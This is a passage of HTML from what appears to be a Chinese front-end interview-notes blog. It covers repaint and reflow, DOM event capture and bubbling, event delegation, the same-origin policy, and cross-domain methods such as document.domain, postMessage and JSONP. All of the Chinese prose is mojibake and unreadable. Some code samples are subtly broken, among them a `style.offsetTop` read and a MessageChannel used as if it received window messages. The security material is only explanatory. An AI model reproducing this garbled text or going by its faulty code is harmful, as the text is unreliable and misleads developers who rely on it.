scrollerï¼‰ã€‚åŸç†æ˜¯åªæ¸²æŸ“å¯è§†åŒºåŸŸå†…çš„å†…å®¹ï¼Œéå¯è§åŒºåŸŸçš„é‚£å°±å®Œå…¨ä¸æ¸²æŸ“äº†ï¼Œå½“ç”¨æˆ·åœ¨æ»šåŠ¨çš„æ—¶å€™å°±å®æ—¶å»æ›¿æ¢æ¸²æŸ“çš„å†…å®¹ã€‚</p><h1 id="é‡ç»˜ï¼ˆRepaintï¼‰å’Œå›æµï¼ˆReflowï¼‰"><a href="#é‡ç»˜ï¼ˆRepaintï¼‰å’Œå›æµï¼ˆReflowï¼‰" class="headerlink" title="é‡ç»˜ï¼ˆRepaintï¼‰å’Œå›æµï¼ˆReflowï¼‰"></a>é‡ç»˜ï¼ˆRepaintï¼‰å’Œå›æµï¼ˆReflowï¼‰</h1><p>é‡ç»˜å’Œå›æµä¼šåœ¨æˆ‘ä»¬è®¾ç½®èŠ‚ç‚¹æ ·å¼æ—¶é¢‘ç¹å‡ºç°ï¼ŒåŒæ—¶ä¹Ÿä¼šå¾ˆå¤§ç¨‹åº¦ä¸Šå½±å“æ€§èƒ½ã€‚</p><ul><li>é‡ç»˜æ˜¯å½“<strong>èŠ‚ç‚¹éœ€è¦æ›´æ”¹å¤–è§‚è€Œä¸ä¼šå½±å“å¸ƒå±€</strong>çš„ï¼Œæ¯”å¦‚æ”¹å˜ <code>color</code> </li><li>å›æµæ˜¯<strong>å¸ƒå±€æˆ–è€…å‡ ä½•å±æ€§éœ€è¦æ”¹å˜</strong></li></ul><p>å›æµ<strong>å¿…å®š</strong>ä¼šå‘ç”Ÿé‡ç»˜ï¼Œé‡ç»˜<strong>ä¸ä¸€å®š</strong>ä¼šå¼•å‘å›æµã€‚å›æµæ‰€éœ€çš„æˆæœ¬æ¯”é‡ç»˜é«˜çš„å¤šï¼Œæ”¹å˜çˆ¶èŠ‚ç‚¹é‡Œçš„å­èŠ‚ç‚¹å¾ˆå¯èƒ½ä¼šå¯¼è‡´çˆ¶èŠ‚ç‚¹çš„ä¸€ç³»åˆ—å›æµã€‚ä»¥ä¸‹å‡ ä¸ªåŠ¨ä½œå¯èƒ½ä¼šå¯¼è‡´æ€§èƒ½é—®é¢˜ï¼š</p><ul><li>æ”¹å˜ <code>window</code> å¤§å°</li><li>æ”¹å˜å­—ä½“</li><li>æ·»åŠ æˆ–åˆ é™¤æ ·å¼</li><li>æ–‡å­—æ”¹å˜</li><li>å®šä½æˆ–è€…æµ®åŠ¨</li><li>ç›’æ¨¡å‹</li></ul><h2 id="å‡å°‘é‡ç»˜å’Œå›æµ"><a href="#å‡å°‘é‡ç»˜å’Œå›æµ" class="headerlink" title="å‡å°‘é‡ç»˜å’Œå›æµ"></a>å‡å°‘é‡ç»˜å’Œå›æµ</h2><ul><li><p>ä½¿ç”¨ <code>transform</code> æ›¿ä»£ <code>top</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¼•èµ·å›æµ</span></span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">&#x27;.test&#x27;</span>).style.top = <span class="string">&#x27;100px&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨ <code>visibility</code> æ›¿æ¢ <code>display: none</code> ï¼Œå› ä¸ºå‰è€…åªä¼šå¼•èµ·é‡ç»˜ï¼Œåè€…ä¼šå¼•å‘å›æµï¼ˆæ”¹å˜äº†å¸ƒå±€ï¼‰</p></li><li><p>ä¸è¦æŠŠèŠ‚ç‚¹çš„å±æ€§å€¼æ”¾åœ¨ä¸€ä¸ªå¾ªç¯é‡Œå½“æˆå¾ªç¯é‡Œçš„å˜é‡</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    <span class="comment">// è·å– offsetTop ä¼šå¯¼è‡´å›æµï¼Œå› ä¸ºéœ€è¦å»è·å–æ­£ç¡®çš„å€¼</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">document</span>.querySelector(<span class="string">&#x27;.test&#x27;</span>).style.offsetTop)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ä¸è¦ä½¿ç”¨ <code>table</code> å¸ƒå±€ï¼Œå¯èƒ½å¾ˆå°çš„ä¸€ä¸ªå°æ”¹åŠ¨ä¼šé€ æˆæ•´ä¸ª <code>table</code> çš„é‡æ–°å¸ƒå±€</p></li><li><p>åŠ¨ç”»å®ç°çš„é€Ÿåº¦é€‰æ‹©ï¼ŒåŠ¨ç”»é€Ÿåº¦è¶Šå¿«ï¼Œå›æµæ¬¡æ•°è¶Šå¤šï¼Œä¹Ÿå¯ä»¥é€‰æ‹©ä½¿ç”¨ <code>requestAnimationFrame</code></p></li><li><p>CSS é€‰æ‹©ç¬¦<strong>ä»å³å¾€å·¦</strong>åŒ¹é…æŸ¥æ‰¾ï¼Œé¿å…èŠ‚ç‚¹å±‚çº§è¿‡å¤š</p></li><li><p>å°†é¢‘ç¹é‡ç»˜æˆ–è€…å›æµçš„èŠ‚ç‚¹è®¾ç½®ä¸ºå›¾å±‚ï¼Œå›¾å±‚èƒ½å¤Ÿé˜»æ­¢è¯¥èŠ‚ç‚¹çš„æ¸²æŸ“è¡Œä¸ºå½±å“åˆ«çš„èŠ‚ç‚¹ã€‚æ¯”å¦‚å¯¹äº <code>video</code> æ ‡ç­¾æ¥è¯´ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å°†è¯¥èŠ‚ç‚¹å˜ä¸ºå›¾å±‚ã€‚è®¾ç½®èŠ‚ç‚¹ä¸ºå›¾å±‚çš„æ–¹å¼æœ‰å¾ˆå¤šï¼š</p><ul><li><code>will-change</code></li><li><code>video</code>ã€<code>iframe</code> æ ‡ç­¾</li></ul></li></ul><h1 id="äº‹ä»¶æ˜¯ä»€ä¹ˆï¼ŸIE-ä¸ç«ç‹çš„äº‹ä»¶æœºåˆ¶æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ-å¦‚ä½•é˜»æ­¢å†’æ³¡ï¼Ÿ"><a href="#äº‹ä»¶æ˜¯ä»€ä¹ˆï¼ŸIE-ä¸ç«ç‹çš„äº‹ä»¶æœºåˆ¶æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ-å¦‚ä½•é˜»æ­¢å†’æ³¡ï¼Ÿ" class="headerlink" title="äº‹ä»¶æ˜¯ä»€ä¹ˆï¼ŸIE ä¸ç«ç‹çš„äº‹ä»¶æœºåˆ¶æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ å¦‚ä½•é˜»æ­¢å†’æ³¡ï¼Ÿ"></a>äº‹ä»¶æ˜¯ä»€ä¹ˆï¼ŸIE ä¸ç«ç‹çš„äº‹ä»¶æœºåˆ¶æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ å¦‚ä½•é˜»æ­¢å†’æ³¡ï¼Ÿ</h1><ul><li>äº‹ä»¶æ˜¯ç”¨æˆ·æ“ä½œç½‘é¡µæ—¶å‘ç”Ÿçš„äº¤äº’åŠ¨ä½œï¼Œè¿˜å¯ä»¥æ˜¯æ–‡æ¡£åŠ è½½ï¼Œçª—å£æ»šåŠ¨å’Œå¤§å°è°ƒæ•´ã€‚äº‹ä»¶è¢«å°è£…æˆä¸€ä¸ª event å¯¹è±¡ï¼ŒåŒ…å«äº†è¯¥äº‹ä»¶å‘ç”Ÿæ—¶çš„æ‰€æœ‰ç›¸å…³ä¿¡æ¯ï¼ˆ event çš„å±æ€§ï¼‰ä»¥åŠå¯ä»¥å¯¹äº‹ä»¶è¿›è¡Œçš„æ“ä½œï¼ˆ event çš„æ–¹æ³•ï¼‰ã€‚</li><li>äº‹ä»¶å¤„ç†æœºåˆ¶ï¼šIE æ”¯æŒäº‹ä»¶å†’æ³¡ã€Firefox æ”¯æŒäº‹ä»¶å†’æ³¡å’Œäº‹ä»¶æ•è·ã€‚</li><li>é˜»æ­¢å†’æ³¡ï¼š<code>event.stopPropagation()</code> æˆ– <code>event.cancelBubble = true</code>ï¼ˆIEï¼‰ã€‚</li></ul><h1 id="ä¸‰ç§äº‹ä»¶æ¨¡å‹æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#ä¸‰ç§äº‹ä»¶æ¨¡å‹æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ä¸‰ç§äº‹ä»¶æ¨¡å‹æ˜¯ä»€ä¹ˆï¼Ÿ"></a>ä¸‰ç§äº‹ä»¶æ¨¡å‹æ˜¯ä»€ä¹ˆï¼Ÿ</h1><ul><li><p>DOM0 çº§æ¨¡å‹ã€‚è¿™ç§æ¨¡å‹ä¸ä¼šä¼ æ’­ï¼Œæ‰€ä»¥æ²¡æœ‰äº‹ä»¶æµçš„æ¦‚å¿µï¼Œä½†æ˜¯ç°åœ¨æœ‰çš„æµè§ˆå™¨æ”¯æŒä»¥å†’æ³¡çš„æ–¹å¼å®ç°ï¼Œå®ƒå¯ä»¥åœ¨ç½‘é¡µä¸­ç›´æ¥å®šä¹‰ç›‘å¬å‡½æ•°ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ js å±æ€§æ¥æŒ‡å®šç›‘å¬å‡½æ•°ã€‚è¿™ç§æ–¹å¼æ˜¯æ‰€æœ‰æµè§ˆå™¨éƒ½å…¼å®¹çš„ã€‚</p></li><li><p>IE äº‹ä»¶æ¨¡å‹ã€‚åœ¨è¯¥äº‹ä»¶æ¨¡å‹ä¸­ä¸€æ¬¡äº‹ä»¶å…±æœ‰ä¸¤ä¸ªè¿‡ç¨‹ï¼Œ<strong>äº‹ä»¶å¤„ç†é˜¶æ®µ</strong>å’Œ<strong>äº‹ä»¶å†’æ³¡é˜¶æ®µ</strong>ã€‚äº‹ä»¶å¤„ç†é˜¶æ®µä¼šé¦–å…ˆæ‰§è¡Œç›®æ ‡å…ƒç´ ç»‘å®šçš„ç›‘å¬äº‹ä»¶ã€‚ç„¶åæ˜¯äº‹ä»¶å†’æ³¡é˜¶æ®µï¼Œä¾æ¬¡æ£€æŸ¥ç»è¿‡çš„èŠ‚ç‚¹æ˜¯å¦ç»‘å®šäº†äº‹ä»¶ç›‘å¬å‡½æ•°ï¼Œå¦‚æœæœ‰åˆ™æ‰§è¡Œã€‚è¿™ç§æ¨¡å‹é€šè¿‡ <code>attachEvent</code> æ¥æ·»åŠ ç›‘å¬å‡½æ•°ï¼Œå¯ä»¥æ·»åŠ å¤šä¸ªç›‘å¬å‡½æ•°ï¼ŒæŒ‰é¡ºåºä¾æ¬¡æ‰§è¡Œã€‚</p></li><li><p>DOM2 çº§äº‹ä»¶æ¨¡å‹ã€‚åœ¨è¯¥äº‹ä»¶æ¨¡å‹ä¸­ä¸€æ¬¡äº‹ä»¶å…±æœ‰ä¸‰ä¸ªè¿‡ç¨‹ï¼Œç¬¬ä¸€ä¸ªè¿‡ç¨‹æ˜¯<strong>äº‹ä»¶æ•è·é˜¶æ®µ</strong>ã€‚æ•è·æŒ‡çš„æ˜¯äº‹ä»¶ä» document ä¸€ç›´å‘ä¸‹ä¼ æ’­åˆ°ç›®æ ‡å…ƒç´ ï¼Œä¾æ¬¡æ£€æŸ¥ç»è¿‡çš„èŠ‚ç‚¹æ˜¯å¦ç»‘å®šäº†äº‹ä»¶ç›‘å¬å‡½æ•°ï¼Œå¦‚æœæœ‰åˆ™æ‰§è¡Œã€‚åé¢ä¸¤ä¸ªé˜¶æ®µå’Œ IE äº‹ä»¶æ¨¡å‹çš„ä¸¤ä¸ªé˜¶æ®µç›¸åŒã€‚è¿™ç§äº‹ä»¶æ¨¡å‹ç»‘å®šçš„å‡½æ•°æ˜¯ <code>addEventListener</code>ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å¯ä»¥æŒ‡å®šäº‹ä»¶æ˜¯å¦åœ¨æ•è·é˜¶æ®µæ‰§è¡Œã€‚</p></li></ul><h1 id="äº‹ä»¶æœºåˆ¶"><a href="#äº‹ä»¶æœºåˆ¶" class="headerlink" title="äº‹ä»¶æœºåˆ¶"></a>äº‹ä»¶æœºåˆ¶</h1><h2 id="äº‹ä»¶è§¦å‘ä¸‰é˜¶æ®µ"><a href="#äº‹ä»¶è§¦å‘ä¸‰é˜¶æ®µ" class="headerlink" title="äº‹ä»¶è§¦å‘ä¸‰é˜¶æ®µ"></a>äº‹ä»¶è§¦å‘ä¸‰é˜¶æ®µ</h2><p>äº‹ä»¶è§¦å‘æœ‰ä¸‰ä¸ªé˜¶æ®µï¼š</p><ul><li><code>window</code> å¾€äº‹ä»¶è§¦å‘å¤„ä¼ æ’­ï¼Œé‡åˆ°æ³¨å†Œçš„<strong>æ•è·</strong>äº‹ä»¶ä¼šè§¦å‘</li><li>ä¼ æ’­åˆ°äº‹ä»¶è§¦å‘å¤„æ—¶è§¦å‘<strong>æ³¨å†Œ</strong>çš„äº‹ä»¶</li><li>ä»äº‹ä»¶è§¦å‘å¤„å¾€ <code>window</code> ä¼ æ’­ï¼Œé‡åˆ°æ³¨å†Œçš„<strong>å†’æ³¡</strong>äº‹ä»¶ä¼šè§¦å‘</li></ul><p>äº‹ä»¶è§¦å‘ä¸€èˆ¬æ¥è¯´ä¼šæŒ‰ç…§ä¸Šé¢çš„é¡ºåºè¿›è¡Œï¼Œä½†æ˜¯ä¹Ÿæœ‰ç‰¹ä¾‹ï¼Œ<strong>å¦‚æœç»™ä¸€ä¸ª <code>body</code> ä¸­çš„å­èŠ‚ç‚¹åŒæ—¶æ³¨å†Œå†’æ³¡å’Œæ•è·äº‹ä»¶ï¼Œäº‹ä»¶è§¦å‘ä¼šæŒ‰ç…§æ³¨å†Œçš„é¡ºåºæ‰§è¡Œã€‚</strong></p><h2 id="æ³¨å†Œäº‹ä»¶"><a href="#æ³¨å†Œäº‹ä»¶" class="headerlink" title="æ³¨å†Œäº‹ä»¶"></a>æ³¨å†Œäº‹ä»¶</h2><p>é€šå¸¸æˆ‘ä»¬ä½¿ç”¨ <code>addEventListener</code> æ³¨å†Œäº‹ä»¶ï¼Œè¯¥å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°å¯ä»¥æ˜¯å¸ƒå°”å€¼ï¼Œä¹Ÿå¯ä»¥æ˜¯å¯¹è±¡ã€‚å¯¹äºå¸ƒå°”å€¼ <code>useCapture</code> å‚æ•°æ¥è¯´ï¼Œè¯¥å‚æ•°é»˜è®¤å€¼ä¸º <code>false</code> ï¼Œ<code>useCapture</code> å†³å®šäº†æ³¨å†Œçš„äº‹ä»¶æ˜¯æ•è·äº‹ä»¶è¿˜æ˜¯å†’æ³¡äº‹ä»¶ã€‚å¯¹äºå¯¹è±¡å‚æ•°æ¥è¯´ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡ ä¸ªå±æ€§</p><ul><li><code>capture</code>ï¼šå¸ƒå°”å€¼ï¼Œå’Œ <code>useCapture</code> ä½œç”¨ä¸€æ ·</li><li><code>once</code>ï¼šå¸ƒå°”å€¼ï¼Œå€¼ä¸º <code>true</code> è¡¨ç¤ºè¯¥å›è°ƒåªä¼šè°ƒç”¨ä¸€æ¬¡ï¼Œè°ƒç”¨åä¼šç§»é™¤ç›‘å¬</li><li><code>passive</code>ï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ°¸è¿œä¸ä¼šè°ƒç”¨ <code>preventDefault</code></li></ul><p>ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœæˆ‘ä»¬åªå¸Œæœ›äº‹ä»¶åªè§¦å‘åœ¨ç›®æ ‡ä¸Šï¼Œè¿™æ—¶å€™å¯ä»¥ä½¿ç”¨ <code>stopPropagation</code> æ¥é˜»æ­¢äº‹ä»¶çš„è¿›ä¸€æ­¥ä¼ æ’­ã€‚é€šå¸¸æˆ‘ä»¬è®¤ä¸º <code>stopPropagation</code> æ˜¯ç”¨æ¥é˜»æ­¢äº‹ä»¶å†’æ³¡çš„ï¼Œå…¶å®è¯¥å‡½æ•°ä¹Ÿå¯ä»¥é˜»æ­¢æ•è·äº‹ä»¶ã€‚<code>stopImmediatePropagation</code> åŒæ ·ä¹Ÿèƒ½å®ç°é˜»æ­¢äº‹ä»¶ï¼Œä½†æ˜¯è¿˜èƒ½é˜»æ­¢è¯¥äº‹ä»¶ç›®æ ‡æ‰§è¡Œåˆ«çš„æ³¨å†Œäº‹ä»¶ã€‚</p><h2 id="äº‹ä»¶ä»£ç†"><a href="#äº‹ä»¶ä»£ç†" class="headerlink" title="äº‹ä»¶ä»£ç†"></a>äº‹ä»¶ä»£ç†</h2><p>å¦‚æœä¸€ä¸ªèŠ‚ç‚¹ä¸­çš„å­èŠ‚ç‚¹æ˜¯åŠ¨æ€ç”Ÿæˆçš„ï¼Œé‚£ä¹ˆå­èŠ‚ç‚¹éœ€è¦æ³¨å†Œäº‹ä»¶çš„è¯<strong>åº”è¯¥æ³¨å†Œåœ¨çˆ¶èŠ‚ç‚¹ä¸Š</strong>ã€‚ï¼ˆå¦‚ ul é‡Œé¢çš„ liï¼‰äº‹ä»¶ä»£ç†çš„æ–¹å¼ç›¸è¾ƒäºç›´æ¥ç»™ç›®æ ‡æ³¨å†Œäº‹ä»¶æ¥è¯´ï¼Œæœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š</p><ul><li>èŠ‚çœå†…å­˜</li><li>ä¸éœ€è¦ç»™å­èŠ‚ç‚¹æ³¨é”€äº‹ä»¶</li></ul><h1 id="ä»€ä¹ˆæ˜¯æµè§ˆå™¨çš„åŒæºæ”¿ç­–ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯æµè§ˆå™¨çš„åŒæºæ”¿ç­–ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯æµè§ˆå™¨çš„åŒæºæ”¿ç­–ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯æµè§ˆå™¨çš„åŒæºæ”¿ç­–ï¼Ÿ</h1><p>æµè§ˆå™¨å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œæœ‰åŒæºç­–ç•¥ã€‚ä¸€ä¸ªåŸŸä¸‹çš„ js è„šæœ¬åœ¨æœªç»å…è®¸çš„æƒ…å†µä¸‹ï¼Œä¸èƒ½å¤Ÿè®¿é—®å¦ä¸€ä¸ªåŸŸçš„å†…å®¹ã€‚è¿™é‡Œçš„åŒæºæŒ‡çš„æ˜¯ä¸¤ä¸ªåŸŸçš„åè®®ã€åŸŸåã€ç«¯å£å·å¿…é¡»ç›¸åŒï¼Œ<strong>æœ‰ä¸€ä¸ªä¸åŒå°±æ˜¯è·¨åŸŸ</strong>ã€‚</p><p>åŒæºæ”¿ç­–ä¸»è¦é™åˆ¶äº†ä¸‰ä¸ªæ–¹é¢ï¼š</p><ul><li><p>ç¬¬ä¸€ä¸ªæ˜¯å½“å‰åŸŸä¸‹çš„ js è„šæœ¬ä¸èƒ½å¤Ÿè®¿é—®å…¶ä»–åŸŸä¸‹çš„ cookieã€localStorage å’Œ indexDBã€‚</p></li><li><p>ç¬¬äºŒä¸ªæ˜¯å½“å‰åŸŸä¸‹çš„ js è„šæœ¬ä¸èƒ½å¤Ÿæ“ä½œè®¿é—®æ“ä½œå…¶ä»–åŸŸä¸‹çš„ DOMã€‚</p></li><li><p>ç¬¬ä¸‰ä¸ªæ˜¯å½“å‰åŸŸä¸‹ ajax æ— æ³•å‘é€è·¨åŸŸè¯·æ±‚ã€‚</p></li></ul><p><strong>é‚£ä¹ˆæ˜¯å‡ºäºä»€ä¹ˆå®‰å…¨è€ƒè™‘æ‰ä¼šå¼•å…¥è¿™ç§æœºåˆ¶å‘¢ï¼Ÿ</strong> å…¶å®ä¸»è¦æ˜¯ç”¨æ¥é˜²æ­¢ CSRF æ”»å‡»çš„ã€‚ç®€å•ç‚¹è¯´ï¼ŒCSRF æ”»å‡»æ˜¯åˆ©ç”¨ç”¨æˆ·çš„ç™»å½•æ€å‘èµ·æ¶æ„è¯·æ±‚ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ²¡æœ‰åŒæºç­–ç•¥çš„æƒ…å†µä¸‹ï¼ŒA ç½‘ç«™å¯ä»¥è¢«ä»»æ„å…¶ä»–æ¥æºçš„ Ajax è®¿é—®åˆ°å†…å®¹ã€‚å¦‚æœä½ å½“å‰ A ç½‘ç«™è¿˜å­˜åœ¨ç™»å½•æ€ï¼Œé‚£ä¹ˆå¯¹æ–¹å°±å¯ä»¥é€šè¿‡ Ajax è·å¾—ä½ çš„ä»»ä½•ä¿¡æ¯ã€‚</p><p>åŒæºæ”¿ç­–çš„ç›®çš„ä¸»è¦æ˜¯ä¸ºäº†ä¿è¯ç”¨æˆ·çš„ä¿¡æ¯å®‰å…¨ï¼Œå®ƒåªæ˜¯å¯¹ js è„šæœ¬çš„ä¸€ç§é™åˆ¶ï¼Œå¹¶ä¸æ˜¯å¯¹æµè§ˆå™¨çš„é™åˆ¶ï¼Œå¯¹äºä¸€èˆ¬çš„ imgã€æˆ–è€…script è„šæœ¬è¯·æ±‚éƒ½ä¸ä¼šæœ‰è·¨åŸŸçš„é™åˆ¶ï¼Œè¿™æ˜¯å› ä¸ºè¿™äº›æ“ä½œéƒ½ä¸ä¼šé€šè¿‡å“åº”ç»“æœæ¥è¿›è¡Œå¯èƒ½å‡ºç°å®‰å…¨é—®é¢˜çš„æ“ä½œã€‚</p><h1 id="å¦‚ä½•è§£å†³è·¨åŸŸé—®é¢˜ï¼Ÿ"><a href="#å¦‚ä½•è§£å†³è·¨åŸŸé—®é¢˜ï¼Ÿ" class="headerlink" title="å¦‚ä½•è§£å†³è·¨åŸŸé—®é¢˜ï¼Ÿ"></a>å¦‚ä½•è§£å†³è·¨åŸŸé—®é¢˜ï¼Ÿ</h1><p>é¦–å…ˆæˆ‘ä»¬å¦‚æœåªæ˜¯æƒ³è¦å®ç°ä¸»åŸŸåä¸‹çš„ä¸åŒå­åŸŸåçš„è·¨åŸŸæ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è®¾ç½® document.domain æ¥è§£å†³ã€‚</p><h2 id="document-domain"><a href="#document-domain" class="headerlink" title="document.domain"></a>document.domain</h2><p>è¯¥æ–¹å¼åªèƒ½ç”¨äº<strong>äºŒçº§åŸŸåç›¸åŒ</strong>çš„æƒ…å†µä¸‹ï¼Œæ¯”å¦‚ <code>a.test.com</code> å’Œ <code>b.test.com</code> é€‚ç”¨äºè¯¥æ–¹å¼ã€‚</p><p>åªéœ€è¦ç»™é¡µé¢æ·»åŠ  <code>document.domain = &#39;test.com&#39;</code> è¡¨ç¤ºäºŒçº§åŸŸåéƒ½ç›¸åŒå°±å¯ä»¥å®ç°è·¨åŸŸ</p><p>ï¼ˆ2ï¼‰ä½¿ç”¨ location.hash çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸»é¡µé¢åŠ¨æ€çš„ä¿®æ”¹ iframe çª—å£çš„ hash å€¼ï¼Œç„¶ååœ¨ iframe çª—å£é‡Œå®ç°ç›‘å¬å‡½æ•°æ¥å®ç°è¿™æ ·ä¸€ä¸ªå•å‘çš„é€šä¿¡ã€‚å› ä¸ºåœ¨ iframe æ˜¯æ²¡æœ‰åŠæ³•è®¿é—®åˆ°ä¸åŒæºçš„çˆ¶çº§çª—å£çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥ä¿®æ”¹çˆ¶çº§çª—å£çš„ hash å€¼æ¥å®ç°é€šä¿¡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ iframe ä¸­å†åŠ å…¥ä¸€ä¸ª iframe ï¼Œè¿™ä¸ª iframe çš„å†…å®¹æ˜¯å’Œçˆ¶çº§é¡µé¢åŒæºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ window.parent.parent æ¥ä¿®æ”¹æœ€é¡¶çº§é¡µé¢çš„ srcï¼Œä»¥æ­¤æ¥å®ç°åŒå‘é€šä¿¡ã€‚</p><p>ï¼ˆ3ï¼‰ä½¿ç”¨ window.name çš„æ–¹æ³•ï¼Œä¸»è¦æ˜¯åŸºäºåŒä¸€ä¸ªçª—å£ä¸­è®¾ç½®äº† window.name åä¸åŒæºçš„é¡µé¢ä¹Ÿå¯ä»¥è®¿é—®ï¼Œæ‰€ä»¥ä¸åŒæºçš„å­é¡µé¢å¯ä»¥é¦–å…ˆåœ¨ window.name ä¸­å†™å…¥æ•°æ®ï¼Œç„¶åè·³è½¬åˆ°ä¸€ä¸ªå’Œçˆ¶çº§åŒæºçš„é¡µé¢ã€‚è¿™ä¸ªæ—¶å€™çº§é¡µé¢å°±å¯ä»¥è®¿é—®åŒæºçš„å­é¡µé¢ä¸­ window.name ä¸­çš„æ•°æ®äº†ï¼Œè¿™ç§æ–¹å¼çš„å¥½å¤„æ˜¯å¯ä»¥ä¼ è¾“çš„æ•°æ®é‡å¤§ã€‚</p><h2 id="postMessage"><a href="#postMessage" class="headerlink" title="postMessage"></a>postMessage</h2><p>è¿™ç§æ–¹å¼é€šå¸¸ç”¨äºè·å–åµŒå…¥é¡µé¢ä¸­çš„ç¬¬ä¸‰æ–¹é¡µé¢æ•°æ®ã€‚ä¸€ä¸ªé¡µé¢å‘é€æ¶ˆæ¯ï¼Œå¦ä¸€ä¸ªé¡µé¢åˆ¤æ–­æ¥æºå¹¶æ¥æ”¶æ¶ˆæ¯ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å‘é€æ¶ˆæ¯ç«¯</span></span><br><span class="line"><span class="built_in">window</span>.parent.postMessage(<span class="string">&#x27;message&#x27;</span>, <span class="string">&#x27;http://test.com&#x27;</span>)</span><br><span class="line"><span class="comment">// æ¥æ”¶æ¶ˆæ¯ç«¯</span></span><br><span class="line"><span class="keyword">var</span> mc = <span class="keyword">new</span> MessageChannel()</span><br><span class="line">mc.addEventListener(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> origin = event.origin || event.originalEvent.origin</span><br><span class="line">  <span class="keyword">if</span> (origin === <span class="string">&#x27;http://test.com&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;éªŒè¯é€šè¿‡&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h2><p>JSONP çš„åŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯åˆ©ç”¨ <code>&lt;script&gt;</code> æ ‡ç­¾æ²¡æœ‰è·¨åŸŸé™åˆ¶çš„æ¼æ´ã€‚é€šè¿‡ <code>&lt;script&gt; </code> æ ‡ç­¾æŒ‡å‘ä¸€ä¸ªéœ€è¦è®¿é—®çš„åœ°å€å¹¶æä¾›ä¸€ä¸ªå›è°ƒå‡½æ•°æ¥ æ¥æ”¶æ•°æ® å½“éœ€è¦é€šè®¯æ—¶ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://domain/api?param1=a&amp;param2=b&amp;callback=jsonp&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="function"><span class="keyword">function</span> <span class="title">jsonp</span>(<span class="params">data</span>) </span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="built_in">console</span>.log(data)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>    </span><br></pre></td></tr></table></figure><p>JSONP ä½¿ç”¨ç®€å•ä¸”å…¼å®¹æ€§ä¸é”™ï¼Œä½†æ˜¯åªé™äº <code>get</code> è¯·æ±‚ã€‚</p><p>ï¼ˆ5ï¼‰ä½¿ç”¨ jsonp æ¥å®ç°è·¨åŸŸè¯·æ±‚ï¼Œå®ƒçš„ä¸»è¦åŸç†æ˜¯é€šè¿‡åŠ¨æ€æ„å»º script  æ ‡ç­¾æ¥å®ç°è·¨åŸŸè¯·æ±‚ï¼Œå› ä¸ºæµè§ˆå™¨å¯¹ script æ ‡ç­¾çš„å¼•å…¥æ²¡æœ‰è·¨åŸŸçš„è®¿é—®é™åˆ¶ ã€‚é€šè¿‡åœ¨è¯·æ±‚çš„ url åæŒ‡å®šä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œç„¶åæœåŠ¡å™¨åœ¨è¿”å›æ•°æ®çš„æ—¶å€™ï¼Œæ„å»ºä¸€ä¸ª json æ•°æ®çš„åŒ…è£…ï¼Œè¿™ä¸ªåŒ…è£…å°±æ˜¯å›è°ƒå‡½æ•°ï¼Œç„¶åè¿”å›ç»™å‰ç«¯ï¼Œå‰ç«¯æ¥æ”¶åˆ°æ•°æ®åï¼Œå› ä¸ºè¯·æ±‚çš„æ˜¯è„šæœ¬æ–‡ä»¶ï¼Œæ‰€ä»¥ä¼šç›´æ¥æ‰§è¡Œï¼Œè¿™æ ·æˆ‘ä»¬å…ˆå‰å®šä¹‰å¥½çš„å›è°ƒå‡½æ•°å°±å¯ä»¥è¢«è°ƒç”¨ï¼Œä»è€Œå®ç°äº†è·¨åŸŸè¯·æ±‚çš„å¤„ç†ã€‚è¿™ç§æ–¹å¼åªèƒ½ç”¨äº get è¯·æ±‚ã€‚</p><h2 id="CORS"><a href="#CORS" 